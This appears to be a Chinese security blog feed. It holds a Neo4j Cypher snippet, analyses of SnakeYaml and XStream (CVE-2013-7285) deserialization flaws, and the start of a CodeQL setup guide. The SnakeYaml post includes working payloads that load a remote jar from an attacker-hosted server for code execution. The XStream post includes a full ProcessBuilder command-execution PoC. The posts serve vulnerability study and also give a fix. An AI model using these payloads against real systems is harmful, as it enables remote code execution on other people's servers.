<p><strong>关系同构</strong>：对于每个路径匹配记录，不能多次返回相同的关系。</p>
<p>在另一个双节点示例中，例如<code>(a:Node)-[r:R]-&gt;(b:Node)</code>; 使用关系同构约束只能找到长度为 1 的路径。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MATCH p = ()-[*1]-()</span><br><span class="line">RETURN nodes(p)</span><br><span class="line"></span><br><span class="line">这将返回两个结果记录[a, b]，以及[b, a].</span><br></pre></td></tr></table></figure>

<p><strong>Cypher 利用关系同构进行路径匹配</strong>：寻找用户朋友的朋友，并且不能返回用户本身。创建如下数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE</span><br><span class="line">  (adam:User &#123;name: &#x27;Adam&#x27;&#125;),</span><br><span class="line">  (pernilla:User &#123;name: &#x27;Pernilla&#x27;&#125;),</span><br><span class="line">  (david:User &#123;name: &#x27;David&#x27;&#125;),</span><br><span class="line">  (adam)-[:FRIEND]-&gt;(pernilla),</span><br><span class="line">  (pernilla)-[:FRIEND]-&gt;(david)</span><br></pre></td></tr></table></figure>

<p>寻找Adam朋友的朋友</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MATCH (user:User &#123;name: &#x27;Adam&#x27;&#125;)-[r1:FRIEND]-()-[r2:FRIEND]-(friend_of_a_friend)</span><br><span class="line">RETURN friend_of_a_friend.name AS fofName</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/07/14/YJoSy5MXWlspHzO.png" alt="image-20220714161410979"></p>
<p>如果查询应该返回用户，则可以将匹配分布在多个<code>MATCH</code>子句中，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MATCH (user:User &#123;name: &#x27;Adam&#x27;&#125;)-[r1:FRIEND]-(friend)</span><br><span class="line">MATCH (friend)-[r2:FRIEND]-(friend_of_a_friend)</span><br><span class="line">RETURN friend_of_a_friend.name AS fofName</span><br></pre></td></tr></table></figure>

<p>目前先看到这，后续的语法学完之后再补充。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://neo4j.com/docs/">https://neo4j.com/docs/</a></p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>neo4j</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全之SnakeYaml反序列化分析</title>
    <url>/2022/07/18/Java%E5%AE%89%E5%85%A8%E4%B9%8BSnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer"/>

<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>之前在复现若依的漏洞时，接触到了<code>SnakeYaml</code>反序列化，现在分析一下漏洞触发的原理。</p>
<span id="more"></span>

<h3 id="SnakeYaml-概述"><a href="#SnakeYaml-概述" class="headerlink" title="SnakeYaml 概述"></a>SnakeYaml 概述</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p><code>YAML</code>语言比普通的xml与properties等配置文件的可读性更高，像是Spring系列就支持<code>YAML</code>的配置文件。<code>SnakeYaml</code>是用来解析<code>YAML</code>，将<code>YAML</code>文档转换为JAVA对象，以及将JAVA对象序列化为<code>YAML</code>文档。</p>
<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>要在项目中使用<code>SnakeYAML</code>，需要添加Maven依赖项</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.yaml<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>snakeyaml<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.27<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String	dump(Object data)</span><br><span class="line">将Java对象序列化为YAML字符串。</span><br><span class="line">void	dump(Object data, Writer output)</span><br><span class="line">将Java对象序列化为YAML流。</span><br><span class="line">String	dumpAll(Iterator&lt;? extends Object&gt; data)</span><br><span class="line">将一系列Java对象序列化为YAML字符串。</span><br><span class="line">void	dumpAll(Iterator&lt;? extends Object&gt; data, Writer output)</span><br><span class="line">将一系列Java对象序列化为YAML流。</span><br><span class="line">String	dumpAs(Object data, Tag rootTag, DumperOptions.FlowStyle flowStyle)</span><br><span class="line">将Java对象序列化为YAML字符串。</span><br><span class="line">String	dumpAsMap(Object data)</span><br><span class="line">将Java对象序列化为YAML字符串。</span><br><span class="line">&lt;T&gt; T	load(InputStream io)</span><br><span class="line">解析流中唯一的YAML文档，并生成相应的Java对象。</span><br><span class="line">&lt;T&gt; T	load(Reader io)</span><br><span class="line">解析流中唯一的YAML文档，并生成相应的Java对象。</span><br><span class="line">&lt;T&gt; T	load(String yaml)</span><br><span class="line">解析字符串中唯一的YAML文档，并生成相应的Java对象。</span><br><span class="line">Iterable&lt;Object&gt;	loadAll(InputStream yaml)</span><br><span class="line">解析流中的所有YAML文档，并生成相应的Java对象。</span><br><span class="line">Iterable&lt;Object&gt;	loadAll(Reader yaml)</span><br><span class="line">解析字符串中的所有YAML文档，并生成相应的Java对象。</span><br><span class="line">Iterable&lt;Object&gt;	loadAll(String yaml)</span><br><span class="line">解析字符串中的所有YAML文档，并生成相应的Java对象。</span><br></pre></td></tr></table></figure>

<p>主要关注序列化函数和反序列化的函数</p>
<ul>
<li><code>Yaml.load()</code>：入参是一个字符串或者一个文件，结果序列化之后返回一个JAVA对象。</li>
<li><code>Yaml.dump()</code>：将一个对象转化为<code>YAML</code>文件格式。</li>
</ul>
<h4 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h4><p><code>User</code>类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test.yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>YamlDemo</code>类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test.yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">YamlDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">l2sec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        l2sec.setName(<span class="string">&quot;l2sec&quot;</span>);</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">dump</span> <span class="operator">=</span> yaml.dump(l2sec);</span><br><span class="line">        System.out.println(dump);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p><img src="https://s2.loli.net/2022/07/18/qQZRFnWNTegCydI.png" alt="image-20220718155531676"></p>
<p>输出如下字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!!com.test.yaml.User &#123;name: l2sec&#125;</span><br></pre></td></tr></table></figure>

<p>这里的<code>!!</code>类似于fastjson的<code>@type</code>用于指定反序列化的全类名</p>
<h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>再新建一个Person类，在各个方法中添加了print输出，目的是测试在反序列化时会触发这个类中的哪些方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test.yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getName方法&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了setName方法&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getAge方法&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了setAge方法&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在YamlDemo2中，通过<code>!!</code>指定类名需要写全类名</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test.yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">YamlDemo2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Serialize();</span><br><span class="line">        Deserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span>  <span class="keyword">void</span> <span class="title function_">Serialize</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        person.setName(<span class="string">&quot;l2sec&quot;</span>);</span><br><span class="line">        person.setAge(<span class="number">20</span>);</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">dump</span> <span class="operator">=</span> yaml.dump(person);</span><br><span class="line">        System.out.println(dump);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Deserialize</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;!!com.test.yaml.Person &#123;age: 20, name: l2sec&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> yaml.load(className);</span><br><span class="line">        System.out.println(person.getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p><img src="https://s2.loli.net/2022/07/18/bnCFtgYScMV9fkL.png" alt="image-20220718161210782"></p>
<p>输出如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">调用了构造方法</span><br><span class="line">调用了setName方法</span><br><span class="line">调用了setAge方法</span><br><span class="line">!!com.test.yaml.Person &#123;age: 20, name: l2sec&#125;</span><br><span class="line"></span><br><span class="line">调用了构造方法</span><br><span class="line">调用了getAge方法</span><br><span class="line">20</span><br></pre></td></tr></table></figure>

<p>可以看到在序列化的时候触发set方法和构造方法。</p>
<h3 id="反序列化漏洞分析"><a href="#反序列化漏洞分析" class="headerlink" title="反序列化漏洞分析"></a>反序列化漏洞分析</h3><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>运行下面POC代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test.yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">YamlExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">context</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\&quot;http://e8c2f892.dns.1433.eu.org\&quot;]]]]\n&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(context);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行结果如下，成功触发dnslog</p>
<p><img src="https://s2.loli.net/2022/07/18/W3s1NU7KAl5drtz.png" alt="image-20220718162745602"></p>
<p>如果需要触发RCE，我们可以借用这个<a href="https://github.com/artsploit/yaml-payload/">github</a>项目，修改<code>AwesomeScriptEngineFactory.java</code>的代码。在构造方法或者静态代码块中写好触发命令执行的代码即可。（一般针对出网环境）</p>
<p><img src="https://s2.loli.net/2022/07/18/dJeEQa7rA8vOcC3.png" alt="image-20220718164159659"></p>
<p>修改好后，编译成class文件，并打包成jar</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src/ .</span><br></pre></td></tr></table></figure>

<p>上传到vps上，开启一个http服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server --cgi 8888</span><br></pre></td></tr></table></figure>

<p>编写测试类<code>YamlExploit</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test.yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">YamlExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">context</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\&quot;http://ip:port/yaml-payload.jar\&quot;]]]]\n&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(context);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果如下</p>
<p><img src="https://s2.loli.net/2022/07/18/thdoyMNwEUiOQfk.png" alt="image-20220718164127927"></p>
<h4 id="SPI机制"><a href="#SPI机制" class="headerlink" title="SPI机制"></a>SPI机制</h4><p>在漏洞分析前需要了解下SPI的机制，在上面的payload中看到是使用<code>ScriptEngineManager</code>类来进行构造，<code>ScriptEngineManager</code>利用的底层就是SPI机制。</p>
<p><strong>SPI（Service Provider Interface）</strong>，是JDK内置的一种<strong>服务提供发现机制</strong>，可以用来启用框架扩展和替换组件，主要是被框架的开发人员使用，比如java.sql.Driver接口，其他不同厂商可以针对同一接口做出不同的实现，MySQL和PostgreSQL都有不同的实现提供给用户，而Java的SPI机制可以为某个接口寻找服务实现。Java中SPI机制主要思想是将装配的控制权移到程序之外，在模块化设计中这个机制尤其重要，其核心思想就是<strong>解耦</strong>。</p>
<p>当服务的提供者提供了一种接口的实现之后，需要在classpath下的META-INF&#x2F;services&#x2F;目录里创建一个以服务接口命名的文件，这个文件里的内容就是这个接口的具体的实现类。当其他的程序需要这个服务的时候，就可以通过查找这个jar包（一般都是以jar包做依赖）的META-INF&#x2F;services&#x2F;中的配置文件，配置文件中有接口的具体实现类名，可以根据这个类名进行加载实例化，就可以使用该服务了。</p>
<h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>全版本</p>
<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>根据前面的例子，我们可以知道YAML反序列化时可以通过<code>!!</code>+全类名的方式指定要反序列化的类，反序列化时就会实例化该类，可以通过构造<code>ScriptEngineManager</code>的payload并利用SPI机制通过URLClassLoader或者其他payload如JNDI的方式加载远程并实例化恶意类，从而实现RCE。</p>
<h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>修复方案：加入<code>new SafeConstructor()</code>类进行过滤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Yaml yaml = new Yaml(new SafeConstructor());</span><br><span class="line">yaml.load(context);</span><br></pre></td></tr></table></figure>

<h4 id="审计注意的点"><a href="#审计注意的点" class="headerlink" title="审计注意的点"></a>审计注意的点</h4><p>在审计中其实就可以直接定位<code>yaml.load();</code>，然后进行回溯，如若参数可控，那么就可以尝试传入payload。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/nice0e3/p/14514882.html">https://www.cnblogs.com/nice0e3/p/14514882.html</a></p>
<p><a href="https://tttang.com/archive/1591/">https://tttang.com/archive/1591/</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全之XStream 漏洞分析</title>
    <url>/2022/07/19/Java%E5%AE%89%E5%85%A8%E4%B9%8BXStream-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer"/>

<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>XStream是一个实现javaBean与XML互相转换的工具，极大地简化了开发人员的对XML的处理。</p>
<span id="more"></span>

<h4 id="添加依赖"><a href="#添加依赖" class="headerlink" title="添加依赖"></a>添加依赖</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">     &lt;groupId&gt;com.thoughtworks.xstream&lt;/groupId&gt;</span><br><span class="line">     &lt;artifactId&gt;xstream&lt;/artifactId&gt;</span><br><span class="line">     &lt;version&gt;1.4.6&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h4><p>序列化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        person.setName(<span class="string">&quot;l2sec&quot;</span>);</span><br><span class="line">        person.setAge(<span class="number">10</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> xStream.toXML(person);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>反序列化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> <span class="string">&quot;&lt;com.test.yaml.Person&gt;\n&quot;</span> +</span><br><span class="line">              <span class="string">&quot;  &lt;name&gt;l2sec&lt;/name&gt;\n&quot;</span> +</span><br><span class="line">              <span class="string">&quot;  &lt;age&gt;10&lt;/age&gt;\n&quot;</span> +</span><br><span class="line">              <span class="string">&quot;&lt;/com.test.yaml.Person&gt;&quot;</span>;</span><br><span class="line">      <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> (Person)xStream.fromXML(xml);</span><br><span class="line">      System.out.println(person.getAge());</span><br></pre></td></tr></table></figure>

<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="CVE-2013-7285"><a href="#CVE-2013-7285" class="headerlink" title="CVE-2013-7285"></a>CVE-2013-7285</h4><h5 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h5><p>1.4.x&lt;&#x3D;1.4.6或1.4.10</p>
<h5 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h5><p>这个编号是XStream的第一个cve编号，经典的EventHandler利用链，它的利用方式是在反序列化解析xml的过程中对绑定EventHandler的动态代理对象调用其绑定接口的方法从而触发到EventHandler的invoke方法，最终触发了命令执行</p>
<h5 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test.xstream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XstreamExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span></span><br><span class="line">                <span class="string">&quot;&lt;sorted-set&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    &lt;string&gt;foo&lt;/string&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    &lt;dynamic-proxy&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        &lt;handler class=\&quot;java.beans.EventHandler\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;            &lt;target class=\&quot;java.lang.ProcessBuilder\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                &lt;command&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                    &lt;string&gt;cmd&lt;/string&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                    &lt;string&gt;/C&lt;/string&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                    &lt;string&gt;calc&lt;/string&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                &lt;/command&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;            &lt;/target&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;            &lt;action&gt;start&lt;/action&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        &lt;/handler&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    &lt;/dynamic-proxy&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&lt;/sorted-set&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        xStream.fromXML(xml);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>codeql学习（1）</title>
    <url>/2022/09/08/codeql%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer"/>

<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>codeql是一个将代码转化成类似数据库的形式，并基于该database进行分析的引擎。在 codeql中，代码被视为数据。安全漏洞、Bug 和其他错误被建模为可针对从代码中提取的数据库执行的查询。</p>
<h3 id="codeql分析"><a href="#codeql分析" class="headerlink" title="codeql分析"></a>codeql分析</h3><p>codeql分析可分为三个步骤：</p>
<ol>
<li>创建codeql数据库</li>
<li>运行codeql查询语句分析数据库</li>
<li>解析查询结果</li>
</ol>
<h3 id="下载与安装"><a href="#下载与安装" class="headerlink" title="下载与安装"></a>下载与安装</h3><p>codeql本身包含两部分：解析引擎+<code>SDK</code>。</p>
<ul>
<li>解析引擎用来解析我们编写的规则；</li>
<li>SDK为开源的，里面包含大部分现成的漏洞规则，我们也可以利用其编写自定义规则；</li>
</ul>
<p>codeql解析引擎：<a href="https://github.com/github/codeql-cli-binaries/releases/latest/download/codeql.zip">CodeQL-cli</a> ，下载并设置好<code>codeql</code>环境变量；</p>
<p>SDK：<a href="https://github.com/github/codeql/archive/refs/tags/codeql-cli/latest.zip">codeql查询包</a>，用于分析查询的库文件和基础元数据等；</p>
<p>下载好codeql解析引擎和SDK后，我这里把他们放到同一个文件夹里</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209081117452.png" alt="image-20220908111750354"></p>
<p>配置好环境变量后，在cmd中输入codeql，出现如下结果代表安装成功</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209081119459.png" alt="image-20220908111902236"></p>
<h3 id="数据库创建"><a href="#数据库创建" class="headerlink" title="数据库创建"></a>数据库创建</h3><p>数据库创建有两种方式：</p>
<ol>
<li>在线创建</li>
<li>命令行创建</li>
</ol>
<h4 id="在线创建"><a href="#在线创建" class="headerlink" title="在线创建"></a>在线创建</h4><p>通过<a href="https://lgtm.com/dashboard">lgtm在线网站</a>编译github或Bitbucket 项目，打开网址，输入项目地址，点击<code>Follow</code>，在下面列表会产生该项目，再点击<code>Enable PR code reviews</code>，进入如下界面，鼠标移到<code>Query this project</code>,点击下载数据库即可。</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209081130155.png" alt="image-20220908113012898"></p>
<h4 id="命令行创建"><a href="#命令行创建" class="headerlink" title="命令行创建"></a>命令行创建</h4><p>下载好对应的项目，执行<code>codeql database create [编译后的数据库生成路径] --language=java --command=&quot;mvn clean install --file pom.xml&quot; --source-root=&quot;./apps/WebGoat&quot;</code></p>
<ul>
<li><code>-l,--language=&lt;lang&gt;</code> 创建数据库的语言</li>
<li><code>-s,--source-root=&lt;dir&gt;</code> 项目的源代码路径，默认为当前路径</li>
<li><code>-j,--threads=&lt;num&gt;</code> 生成数据库使用的线程数，默认为1</li>
<li><code>-M,--ram=&lt;MB&gt;</code> 使用多大内存执行生成命令</li>
<li><code>-c.--command=&lt;command&gt;</code> 构建项目使用的命令，如maven项目使用<code>mvn clean package</code>等</li>
<li><code>--overwrite</code> 覆盖之前生成的数据库，如果不加上该命令，若存在同名数据库，则报错。</li>
</ul>
<p>在使用命令行创建数据库时可能会出现报错，影响数据库的创建，可参考如下链接：</p>
<p><a href="https://blog.51cto.com/ios9/3113441">https://blog.51cto.com/ios9/3113441</a></p>
<p>在pom.xml中添加如下插件，忽略报错即可。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span></span><br><span class="line">		maven-surefire-plugin</span><br><span class="line">	<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">testFailureIgnore</span>&gt;</span>true<span class="tag">&lt;/<span class="name">testFailureIgnore</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span 